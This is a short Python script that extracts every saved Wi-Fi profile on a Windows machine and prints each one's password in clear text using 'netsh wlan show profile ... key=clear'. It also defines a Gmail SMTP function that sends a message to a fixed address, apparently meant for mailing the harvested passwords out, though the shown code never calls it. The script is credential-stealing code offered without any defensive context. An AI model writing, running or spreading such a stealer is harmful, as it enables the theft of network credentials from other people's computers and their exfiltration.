import subprocess, smtplib, re

def send_mail(email, password, message):
  server = smtplib.SMTP("smtp.gmail.com", 587)
  server.starttls()
  server.login(email, password)
  server.sendmail(email, email, message)
  server.quit()

command = "netsh wlan show profile"

output = subprocess.check_output(command.split(' '), text=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", output)

print(network_names_list)

for network in network_names_list:
  command = f'netsh wlan show profile "{network}" key=clear'
  cur_result = subprocess.check_output(command, text=True)
  print(cur_result)